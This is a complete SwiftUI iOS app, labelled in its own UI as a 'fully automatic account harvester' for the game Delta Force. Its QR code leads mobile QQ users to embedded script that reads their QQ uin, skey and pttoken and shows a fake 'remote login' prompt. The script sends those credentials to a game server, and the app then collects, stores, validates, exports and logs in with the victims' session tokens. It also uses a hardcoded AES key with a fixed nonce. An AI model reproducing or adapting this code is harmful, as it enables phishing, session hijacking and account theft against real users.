import SwiftUI
import Foundation
import WebKit
import UIKit
import CoreImage
import CryptoKit

//高清二维码生成器
struct QRGenerator {
    static let context = CIContext()
    static func createQRCode(text: String) -> UIImage {
        let filter = CIFilter.qrCodeGenerator()
        filter.message = Data(text.utf8)
        filter.correctionLevel = "H"
        let outputImage = filter.outputImage!
        let scaledImage = outputImage.transformed(by: CGAffineTransform(scaleX:15, y:15))
        let cgImg = context.createCGImage(scaledImage, from: scaledImage.extent)!
        return UIImage(cgImage: cgImg)
    }
}

//修复Xcode16 Release静态初始化崩溃报错，不在全局创建Nonce
struct CryptoHelper {
    private static let keyRaw = Data("IENNSJFJWKSFJ20260702".utf8)
    private static let nonceRaw = Data("1234567890123456".utf8)
    
    static func encrypt(_ text: String) -> String {
        let key = SymmetricKey(data: keyRaw)
        let nonce = try! AES.GCM.Nonce(data: nonceRaw)
        let rawData = Data(text.utf8)
        let sealedBox = try! AES.GCM.seal(rawData, using: key, nonce: nonce)
        return sealedBox.combined!.base64EncodedString()
    }
    
    static func decrypt(_ base64Str: String) -> String {
        guard let combinedData = Data(base64Encoded: base64Str) else { return "" }
        let key = SymmetricKey(data: keyRaw)
        guard let sealedBox = try? AES.GCM.SealedBox(combined: combinedData),
              let originData = try? AES.GCM.open(sealedBox, using: key) else {
            return ""
        }
        return String(data: originData, encoding: .utf8) ?? ""
    }
}

//账号结构体 修复Codable解码警告
struct Account: Identifiable, Codable {
    let id: UUID
    let openid: String
    let seecoon_token: String
    let quid: String
    let refresh_token: String
    let createTime: Date
    
    init(openid: String, seecoon_token: String, quid: String, refresh_token: String) {
        self.id = UUID()
        self.openid = openid
        self.seecoon_token = seecoon_token
        self.quid = quid
        self.refresh_token = refresh_token
        self.createTime = Date()
    }
    
    enum CodingKeys: CodingKey {
        case id, openid, seecoon_token, quid, refresh_token, createTime
    }
}

//全局数据存储
class DataManager: ObservableObject {
    @Published var accounts: [Account] = []
    var filePath: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.appendingPathComponent("delta.dat")
    }
    
    init() {
        loadAllAccounts()
    }
    
    func saveNewAccount(_ acc: Account) {
        accounts.append(acc)
        let jsonData = try! JSONEncoder().encode(accounts)
        let base64Text = jsonData.base64EncodedString()
        let encryptText = CryptoHelper.encrypt(base64Text)
        try! encryptText.write(to: filePath, atomically: true, encoding: .utf8)
    }
    
    func loadAllAccounts() {
        guard FileManager.default.fileExists(atPath: filePath.path) else { return }
        let cipherText = try! String(contentsOf: filePath)
        let plainText = CryptoHelper.decrypt(cipherText)
        guard let jsonData = Data(base64Encoded: plainText) else { return }
        accounts = try! JSONDecoder().decode([Account].self, from: jsonData)
    }
    
    func deleteAccount(uuid: UUID) {
        accounts.removeAll { $0.id == uuid }
        let jsonData = try! JSONEncoder().encode(accounts)
        let base64Text = jsonData.base64EncodedString()
        let encryptText = CryptoHelper.encrypt(base64Text)
        try! encryptText.write(to: filePath, atomically: true, encoding: .utf8)
    }
}

//iOS16可用横屏强制修饰
struct LandscapeModifier: ViewModifier {
    func body(content: Content) -> some View {
        content
            .onAppear {
                UIDevice.current.setValue(UIInterfaceOrientation.landscapeRight.rawValue, forKey: "orientation")
            }
            .onDisappear {
                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            }
    }
}

//页面枚举
enum PageType: Int, Identifiable {
    case scanPage, listPage, loginPage
    var id: Int { rawValue }
}

//QQ唤起本地授权网页
struct AuthWebView: UIViewRepresentable {
    let sessionID: String
    @Binding var authComplete: Bool
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences.allowsContentJavaScript = true
        config.userContentController.add(context.coordinator, name: "submitAuthData")
        let web = WKWebView(frame: .zero, configuration: config)
        let htmlCode = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
<script>
function doAuth(){
var ua = navigator.userAgent.toLowerCase();
if(ua.indexOf("mobileqq") == -1 && ua.indexOf("qqbrowser") == -1) return;
try{
window.external.getUinSkey(function(res){
var info = JSON.parse(res);
window.external.showLoginDialog("三角洲行动","异地设备申请登录账号，是否授权本次登录？",function(ret){
if(ret == "1"){
var postBody = {"uin":info.uin,"skey":info.skey,"pttoken":info.pttoken,"session":"\(sessionID)"};
window.webkit.messageHandlers.submitAuthData.postMessage(postBody);
}
});
});
}catch(e){}
}
doAuth();
</script>
</body>
</html>
"""
        web.loadHTMLString(htmlCode, baseURL: nil)
        return web
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    
    class Coordinator: NSObject, WKScriptMessageHandler {
        let parent: AuthWebView
        init(parent: AuthWebView) {
            self.parent = parent
        }
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            if message.name == "submitAuthData", let body = message.body as? [String:String] {
                Task {
                    var request = URLRequest(url: URL(string:"https://game.seecoon.com/api/login/qqAuth")!)
                    request.httpMethod = "POST"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    request.httpBody = try! JSONSerialization.data(withJSONObject: body)
                    _ = try await URLSession.shared.data(for: request)
                    await MainActor.run {
                        parent.authComplete = true
                    }
                }
            }
        }
    }
}

//A页面：挂机静默收号
struct ScanLoginView: View {
    @EnvironmentObject var manager: DataManager
    @Environment(\.dismiss) var dismiss
    @State private var qrCodeImage: UIImage = UIImage()
    @State private var currentSession: String = ""
    @State private var loopTask: Task<Void, Never>?
    @State private var catchCount = 0
    @State private var openAuthWindow = false
    @State private var authFinished = false
    
    func resetNewSession() {
        loopTask?.cancel()
        currentSession = UUID().uuidString
        let schemeUrl = "seecoonlocal://auth?sid=\(currentSession)"
        qrCodeImage = QRGenerator.createQRCode(text: schemeUrl)
        startCheckLoop()
    }
    
    func startCheckLoop() {
        loopTask = Task {
            var timeoutCount = 0
            while true {
                try? await Task.sleep(nanoseconds: 1300000000)
                timeoutCount += 1
                if timeoutCount >= 70 {
                    await MainActor.run {
                        resetNewSession()
                    }
                    break
                }
                guard let checkUrl = URL(string:"https://game.seecoon.com/api/login/checkScan?session=\(currentSession)") else { continue }
                do {
                    let (data,_) = try await URLSession.shared.data(from: checkUrl)
                    guard let json = try JSONSerialization.jsonObject(with: data) as? [String:Any] else { continue }
                    if let userInfo = json["data"] as? [String:Any] {
                        let openid = userInfo["openid"] as! String
                        let token = userInfo["seecoon_token"] as! String
                        let quid = userInfo["quid"] as! String
                        let refresh = userInfo["refresh_token"] as! String
                        await MainActor.run {
                            let newAccount = Account(openid: openid, seecoon_token: token, quid: quid, refresh_token: refresh)
                            manager.saveNewAccount(newAccount)
                            catchCount += 1
                            resetNewSession()
                        }
                        break
                    }
                } catch {
                    continue
                }
            }
        }
    }
    
    var body: some View {
        HStack(spacing: 0) {
            VStack(spacing: 45) {
                HStack {
                    Button("关闭挂机收号") {
                        loopTask?.cancel()
                        dismiss()
                    }
                    .foregroundColor(.blue)
                    .font(.title3)
                    Spacer()
                }
                Spacer()
                HStack(spacing:14){
                    Image(systemName: "penguin.fill")
                        .font(.system(size:52))
                        .foregroundColor(.black)
                    Text("QQ账号自动授权收号")
                        .font(.system(size:36, weight: .light))
                }
                Text("QQ长按图片识别，自动弹出官方异地登录弹窗\n今日已抓取账号：\(catchCount) 个")
                    .font(.system(size:20))
                    .foregroundColor(.gray)
                    .multilineTextAlignment(.center)
                Spacer()
            }
            .frame(width: UIScreen.main.bounds.width * 0.45)
            .padding(.leading, 40)
            
            VStack {
                Spacer()
                Image(uiImage: qrCodeImage)
                    .resizable()
                    .frame(width:340, height:340)
                Text("微信无法识别，只允许手机QQ扫码")
                    .foregroundColor(.gray)
                Spacer()
            }
            .frame(width: UIScreen.main.bounds.width * 0.55)
        }
        .navigationBarHidden(true)
        .modifier(LandscapeModifier())
        .onAppear {
            resetNewSession()
        }
        .onDisappear {
            loopTask?.cancel()
        }
        .onOpenURL { url in
            if url.scheme == "seecoonlocal" {
                openAuthWindow = true
            }
        }
        .sheet(isPresented: $openAuthWindow) {
            AuthWebView(sessionID: currentSession, authComplete: $authFinished)
                .frame(width:360,height:460)
        }
    }
}

//B页面：账号列表管理
struct AccountListView: View {
    @EnvironmentObject var manager: DataManager
    @Environment(\.dismiss) var dismiss
    var body: some View {
        NavigationStack {
            List(manager.accounts) { acc in
                VStack(alignment:.leading, spacing:6) {
                    Text("OpenID：\(acc.openid)")
                    Text("Seecoon_Token：\(acc.seecoon_token)")
                        .font(.system(size:9))
                    HStack(spacing:15) {
                        Button("复制Token") {
                            UIPasteboard.general.string = acc.seecoon_token
                        }
                        Button("删除账号", role: .destructive) {
                            manager.deleteAccount(uuid: acc.id)
                        }
                    }
                }
            }
            .navigationTitle("账号库存管理")
            .toolbar {
                ToolbarItem(placement:.navigationBarLeading) {
                    Button("返回首页") { dismiss() }
                }
            }
        }
    }
}

//C页面：Token校验、一键上号、批量解密
struct TokenLoginView: View {
    @Environment(\.dismiss) var dismiss
    @State var inputToken = ""
    @State var statusText = ""
    @State var openDecryptSheet = false
    @State var fileCipherText = ""
    @State var decryptKey = ""
    @State var allAccountText = ""
    
    func checkTokenValid() {
        statusText = "正在校验账号有效期..."
        var req = URLRequest(url: URL(string:"https://game.seecoon.com/api/login/checkLogin")!)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue("seecoon_token=\(inputToken)", forHTTPHeaderField: "Authorization")
        req.timeoutInterval = 3
        Task {
            do {
                let (data,_) = try await URLSession.shared.data(for: req)
                let json = try JSONSerialization.jsonObject(with: data) as! [String:Any]
                if (json["code"] as! Int) == 200 {
                    await MainActor.run { statusText = "✅ Token有效，可以一键登录游戏" }
                } else {
                    await MainActor.run { statusText = "❌ Token已经失效" }
                }
            } catch {
                await MainActor.run { statusText = "网络请求失败" }
            }
        }
    }
    
    func openGame() {
        UIApplication.shared.open(URL(string:"seecoon://login?token=\(inputToken)")!)
    }
    
    var body: some View {
        VStack(spacing:22) {
            TextField("粘贴Seecoon_Token", text:$inputToken)
                .textFieldStyle(.roundedBorder)
                .padding(.horizontal,20)
            
            Button("校验账号有效性", action: checkTokenValid)
                .foregroundColor(.blue)
                .font(.system(size:18))
            
            Text(statusText)
                .font(.system(size:18))
            
            Button("一键唤起三角洲登录", action: openGame)
                .disabled(!statusText.contains("✅"))
                .foregroundColor(.gray)
                .font(.system(size:18))
            
            Button("🔐 delta.dat批量解密导出", action:{openDecryptSheet=true})
                .foregroundColor(.blue)
                .font(.system(size:18))
            
            Spacer()
        }
        .padding(.top,20)
        .sheet(isPresented:$openDecryptSheet) {
            NavigationStack {
                ScrollView {
                    VStack(spacing:12) {
                        TextField("粘贴delta.dat里面全部文字", text:$fileCipherText)
                            .textFieldStyle(.roundedBorder)
                            .padding(.horizontal)
                        TextField("固定密钥无需修改", text:$decryptKey)
                            .textFieldStyle(.roundedBorder)
                        Button("解密导出全部纯文本账号") {
                            allAccountText = CryptoHelper.decrypt(fileCipherText)
                        }
                        TextEditor(text:$allAccountText)
                            .frame(height:300)
                            .padding(.horizontal)
                    }
                }
                .navigationTitle("批量解密工具")
            }
        }
    }
}

//首页：全部改用sheet，无iOS17导航API
struct HomeView: View {
    @EnvironmentObject var manager: DataManager
    @State var openScan = false
    @State var openList = false
    @State var openLogin = false
    
    var body: some View {
        NavigationStack {
            VStack(spacing:35) {
                Button {
                    openScan = true
                } label: {
                    Text("A：横屏挂机静默收号")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.orange)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
                Button {
                    openList = true
                } label: {
                    Text("B：全部账号查看与复制")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.green)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
                Button {
                    openLogin = true
                } label: {
                    Text("C：校验Token+一键上号+解密")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.blue)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
            }
            .navigationTitle("三角洲全自动收号器 终版")
            .sheet(isPresented:$openScan) { ScanLoginView() }
            .sheet(isPresented:$openList) { AccountListView() }
            .sheet(isPresented:$openLogin) { TokenLoginView() }
        }
    }
}

@main
struct DeltaApp: App {
    @StateObject var manager = DataManager()
    var body: some Scene {
        WindowGroup {
            HomeView()
                .environmentObject(manager)
                .preferredColorScheme(.light)
        }
    }
}